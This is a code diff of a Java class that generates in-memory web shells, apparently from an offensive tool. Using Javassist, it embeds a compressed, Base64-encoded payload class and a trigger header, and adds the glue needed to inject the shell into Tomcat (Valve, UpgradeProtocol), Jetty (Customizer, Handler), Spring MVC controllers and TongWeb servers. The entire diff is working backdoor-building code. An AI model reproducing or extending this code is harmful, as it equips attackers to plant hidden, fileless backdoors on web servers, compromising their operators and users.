@@ -1,9 +1,13 @@
 package org.leo.jmg.mem.shell;
 
 import javassist.ClassClassPath;
+import javassist.ClassMap;
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.CtField;
+import javassist.CtConstructor;
+import javassist.CtMethod;
+import javassist.CtNewMethod;
+import javassist.Modifier;
 import org.leo.core.util.asm.ClassFileMinimizer;
 import org.leo.jmg.ServletNamespace;
 import org.leo.jmg.catalog.InjectorDescriptor;
@@ -29,7 +33,9 @@ public class ShellGenerator {
                 request.getResponseCode(),
                 descriptor.getInjectorName(),
                 request.getServerType(),
-                request.getEffectiveServletNamespace()),
+                request.getServerVersion(),
+                request.getEffectiveServletNamespace(),
+                request.isShrink()),
                 descriptor.getShellTemplateName());
     }
 
@@ -60,28 +66,45 @@ public class ShellGenerator {
                 ctClass.getClassFile().setVersionToJava5();
 
                 // 用实际配置替换模板中的静态字段
-                replaceStaticField(ctClass, "headerName",
-                        "private static String headerName = \"" + escapeForJavaString(context.headerName) + "\";");
-                replaceStaticField(ctClass, "headerValue",
-                        "private static String headerValue = \"" + escapeForJavaString(context.headerValue) + "\";");
-                replaceStaticField(ctClass, "coreClassName",
-                        "private static String coreClassName = \"" + escapeForJavaString(context.coreClassName) + "\";");
+                JavassistUtil.replaceStaticField(ctClass, "headerName",
+                        "private static String headerName = \"" + JavassistUtil.escapeJavaString(context.headerName) + "\";");
+                JavassistUtil.replaceStaticField(ctClass, "headerValue",
+                        "private static String headerValue = \"" + JavassistUtil.escapeJavaString(context.headerValue) + "\";");
+                JavassistUtil.replaceStaticField(ctClass, "coreClassName",
+                        "private static String coreClassName = \"" + JavassistUtil.escapeJavaString(context.coreClassName) + "\";");
                 // coreClass 直接写入字符串，调用方需要保证其内容已经做好压缩/编码
-                replaceStaticField(ctClass, "coreClass",
-                        "private static String coreClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(context.coreClassBytes)) + "\";");
-                replaceStaticField(ctClass, "respCode",
+                JavassistUtil.replaceStaticField(ctClass, "coreClass",
+                        "private static String coreClass = \"" + JavassistUtil.escapeJavaString(Base64Utils.gzipAndBase64(context.coreClassBytes)) + "\";");
+                JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "respCode",
                         "private static int respCode = " + context.responseCode + ";");
 
                 if ("ListenerInjector".equals(context.injectorName)) {
                     String methodBody = ResponseUtil.getMethodBody(context.serverType);
                     JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
                 }
+                if ("CustomizerInjector".equals(context.injectorName)) {
+                    addJettyCustomizerContract(pool, ctClass);
+                }
+                if ("Jetty".equalsIgnoreCase(context.serverType)
+                        && "HandlerInjector".equals(context.injectorName)) {
+                    addJettyHandlerContract(pool, ctClass, context.serverVersion);
+                }
+                if ("Tomcat".equalsIgnoreCase(context.serverType)
+                        && "UpgradeInjector".equals(context.injectorName)) {
+                    addTomcatUpgradeContract(pool, ctClass);
+                }
+                if ("ControllerHandlerInjector".equals(context.injectorName)) {
+                    addSpringControllerContract(pool, ctClass, context.servletNamespace);
+                }
 
                 JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);
+                applyContainerContract(ctClass, context);
 
                 // 输出并做一次瘦身
                 byte[] bytes = ctClass.toBytecode();
-                return ClassFileMinimizer.transform(bytes);
+                return context.shrink
+                        ? ClassFileMinimizer.transform(bytes)
+                        : bytes;
             } finally {
                 ctClass.detach();
             }
@@ -89,32 +112,167 @@ public class ShellGenerator {
     }
 
     /**
-     * 使用新的定义替换已有静态字段
+     * TongWeb 6/7/8 对 Catalina API 做了不同包名的重定位。Valve Shell 必须与
+     * 注入器运行时加载的 Valve、Request、Response 类型保持同一套描述符。
      */
-    private void replaceStaticField(CtClass ctClass, String fieldName, String newFieldSrc) throws Exception {
-        try {
-            CtField oldField = ctClass.getDeclaredField(fieldName);
-            ctClass.removeField(oldField);
-        } catch (Exception ignored) {
-            // 如果模板里不存在该字段，直接添加即可
+    private void applyContainerContract(CtClass ctClass,
+                                        ShellTemplateContext context) {
+        if (!"TongWeb".equalsIgnoreCase(context.serverType)
+                || !"ValveInjector".equals(context.injectorName)) {
+            return;
         }
-        ctClass.addField(CtField.make(newFieldSrc, ctClass));
+        String targetPackage;
+        if ("6".equals(context.serverVersion)) {
+            targetPackage = "com.tongweb.web.thor";
+        } else if ("7".equals(context.serverVersion)) {
+            targetPackage = "com.tongweb.catalina";
+        } else if ("8".equals(context.serverVersion)) {
+            targetPackage = "com.tongweb.server";
+        } else {
+            throw new IllegalArgumentException(
+                    "TongWeb Valve 的 serverVersion 必须是 6、7 或 8");
+        }
+
+        ClassMap classMap = new ClassMap();
+        classMap.put("org.apache.catalina.Valve", targetPackage + ".Valve");
+        classMap.put("org.apache.catalina.connector.Request",
+                targetPackage + ".connector.Request");
+        classMap.put("org.apache.catalina.connector.Response",
+                targetPackage + ".connector.Response");
+        ctClass.replaceClassName(classMap);
+    }
+
+    /** 补入 Jetty 9+ HttpConfiguration.Customizer 的真实接口和方法描述符。 */
+    private void addJettyCustomizerContract(ClassPool pool, CtClass ctClass) throws Exception {
+        CtClass customizer = pool.makeInterface(
+                "org.eclipse.jetty.server.HttpConfiguration$Customizer");
+        ctClass.setInterfaces(new CtClass[]{customizer});
+
+        CtClass connector = pool.makeInterface("org.eclipse.jetty.server.Connector");
+        CtClass configuration = pool.makeClass("org.eclipse.jetty.server.HttpConfiguration");
+        CtClass request = pool.makeClass("org.eclipse.jetty.server.Request");
+        CtMethod bridge = new CtMethod(CtClass.voidType, "customize",
+                new CtClass[]{connector, configuration, request}, ctClass);
+        bridge.setModifiers(Modifier.PUBLIC);
+        bridge.setBody("{ customizeRequest($3); }");
+        ctClass.addMethod(bridge);
+    }
+
+    /** 补入 Jetty 7-11 AbstractHandler 父类及对应 Servlet Handler 方法。 */
+    private void addJettyHandlerContract(ClassPool pool,
+                                         CtClass ctClass,
+                                         String serverVersion) throws Exception {
+        if (!"7-10".equals(serverVersion) && !"11".equals(serverVersion)) {
+            throw new IllegalArgumentException(
+                    "Jetty Handler 的 serverVersion 必须是 7-10 或 11");
+        }
+        CtClass abstractHandler = pool.makeClass(
+                "org.eclipse.jetty.server.handler.AbstractHandler");
+        CtConstructor abstractHandlerConstructor =
+                new CtConstructor(new CtClass[0], abstractHandler);
+        abstractHandlerConstructor.setBody("{}");
+        abstractHandler.addConstructor(abstractHandlerConstructor);
+        ctClass.setSuperclass(abstractHandler);
+        for (CtConstructor constructor : ctClass.getDeclaredConstructors()) {
+            constructor.setBody("{ super(); }");
+        }
+
+        CtClass request = pool.makeClass("org.eclipse.jetty.server.Request");
+        CtClass servletRequest = pool.get("javax.servlet.http.HttpServletRequest");
+        CtClass servletResponse = pool.get("javax.servlet.http.HttpServletResponse");
+        CtMethod handle = new CtMethod(CtClass.voidType, "handle",
+                new CtClass[]{pool.get("java.lang.String"), request,
+                        servletRequest, servletResponse}, ctClass);
+        handle.setModifiers(Modifier.PUBLIC);
+        handle.setExceptionTypes(new CtClass[]{
+                pool.get("java.io.IOException"),
+                pool.get("javax.servlet.ServletException")});
+        handle.setBody("{ if (handleRequest($3, $4)) { markHandled($2); return; } forward($args); }");
+        ctClass.addMethod(handle);
+    }
+
+    /**
+     * 补入 Tomcat 8.5-11 UpgradeProtocol 契约。8.5 与 9+ 的
+     * getInternalUpgradeHandler 参数不同，因此同时生成两个重载。
+     */
+    private void addTomcatUpgradeContract(ClassPool pool,
+                                          CtClass ctClass) throws Exception {
+        CtClass upgradeProtocol = pool.makeInterface("org.apache.coyote.UpgradeProtocol");
+        ctClass.setInterfaces(new CtClass[]{upgradeProtocol});
+
+        ctClass.addMethod(CtNewMethod.make(
+                "public boolean acceptUpgradeRequest(Object value){"
+                        + "try{"
+                        + "java.lang.reflect.Method note=value.getClass().getMethod("
+                        + "\"getNote\",new Class[]{Integer.TYPE});"
+                        + "Object request=note.invoke(value,new Object[]{Integer.valueOf(1)});"
+                        + "if(request==null)return false;"
+                        + "java.lang.reflect.Method getter=request.getClass().getMethod("
+                        + "\"getResponse\",new Class[0]);"
+                        + "Object currentResponse=getter.invoke(request,new Object[0]);"
+                        + "equals(new Object[]{request,currentResponse});"
+                        + "return false;"
+                        + "}catch(Throwable ignored){return false;}"
+                        + "}", ctClass));
+
+        CtClass request = pool.makeClass("org.apache.coyote.Request");
+        CtClass adapter = pool.makeInterface("org.apache.coyote.Adapter");
+        CtClass processor = pool.makeInterface("org.apache.coyote.Processor");
+        CtClass socketWrapper = pool.makeClass(
+                "org.apache.tomcat.util.net.SocketWrapperBase");
+        CtClass internalHandler = pool.makeInterface(
+                "org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler");
+
+        addMethod(ctClass, CtClass.booleanType, "accept",
+                new CtClass[]{request}, "{ return acceptUpgradeRequest($1); }");
+        addMethod(ctClass, pool.get("java.lang.String"), "getHttpUpgradeName",
+                new CtClass[]{CtClass.booleanType}, "{ return getClass().getName(); }");
+        addMethod(ctClass, pool.get("byte[]"), "getAlpnIdentifier",
+                new CtClass[0], "{ return new byte[0]; }");
+        addMethod(ctClass, pool.get("java.lang.String"), "getAlpnName",
+                new CtClass[0], "{ return \"\"; }");
+        addMethod(ctClass, processor, "getProcessor",
+                new CtClass[]{socketWrapper, adapter}, "{ return null; }");
+        addMethod(ctClass, internalHandler, "getInternalUpgradeHandler",
+                new CtClass[]{adapter, request}, "{ return null; }");
+        addMethod(ctClass, internalHandler, "getInternalUpgradeHandler",
+                new CtClass[]{socketWrapper, adapter, request}, "{ return null; }");
+    }
+
+    private void addMethod(CtClass owner,
+                           CtClass returnType,
+                           String name,
+                           CtClass[] parameterTypes,
+                           String body) throws Exception {
+        CtMethod method = new CtMethod(returnType, name, parameterTypes, owner);
+        method.setModifiers(Modifier.PUBLIC);
+        method.setBody(body);
+        owner.addMethod(method);
+    }
+
+    /** 按 Spring 5/6 的 Servlet 命名空间补入 MVC Controller 契约。 */
+    private void addSpringControllerContract(ClassPool pool,
+                                             CtClass ctClass,
+                                             ServletNamespace namespace) throws Exception {
+        CtClass controller = pool.get("org.springframework.web.servlet.mvc.Controller");
+        ctClass.setInterfaces(new CtClass[]{controller});
+
+        String servletPrefix = namespace.resolve() == ServletNamespace.JAKARTA
+                ? "jakarta.servlet.http." : "javax.servlet.http.";
+        CtClass request = pool.get(servletPrefix + "HttpServletRequest");
+        CtClass response = pool.get(servletPrefix + "HttpServletResponse");
+        CtClass modelAndView = pool.get("org.springframework.web.servlet.ModelAndView");
+        CtMethod bridge = new CtMethod(modelAndView, "handleRequest",
+                new CtClass[]{request, response}, ctClass);
+        bridge.setModifiers(Modifier.PUBLIC);
+        bridge.setExceptionTypes(new CtClass[]{pool.get("java.lang.Exception")});
+        bridge.setBody("{ return ($r) handleRequestObjects($1, $2); }");
+        ctClass.addMethod(bridge);
     }
 
     /**
      * 将普通字符串转义为可安全写入 Java 字面量的形式
      */
-    private String escapeForJavaString(String str) {
-        if (str == null) {
-            return "";
-        }
-        return str
-                .replace("\\", "\\\\")
-                .replace("\"", "\\\"")
-                .replace("\r", "\\r")
-                .replace("\n", "\\n");
-    }
-
     private static final class ShellTemplateContext {
         private final String shellClassName;
         private final String headerName;
@@ -124,7 +282,9 @@ public class ShellGenerator {
         private final int responseCode;
         private final String injectorName;
         private final String serverType;
+        private final String serverVersion;
         private final ServletNamespace servletNamespace;
+        private final boolean shrink;
 
         private ShellTemplateContext(String shellClassName,
                                      String headerName,
@@ -134,7 +294,9 @@ public class ShellGenerator {
                                      int responseCode,
                                      String injectorName,
                                      String serverType,
-                                     ServletNamespace servletNamespace) {
+                                     String serverVersion,
+                                     ServletNamespace servletNamespace,
+                                     boolean shrink) {
             this.shellClassName = shellClassName;
             this.headerName = headerName;
             this.headerValue = headerValue;
@@ -143,7 +305,9 @@ public class ShellGenerator {
             this.responseCode = responseCode;
             this.injectorName = injectorName;
             this.serverType = serverType;
+            this.serverVersion = serverVersion;
             this.servletNamespace = servletNamespace;
+            this.shrink = shrink;
         }
     }
 }
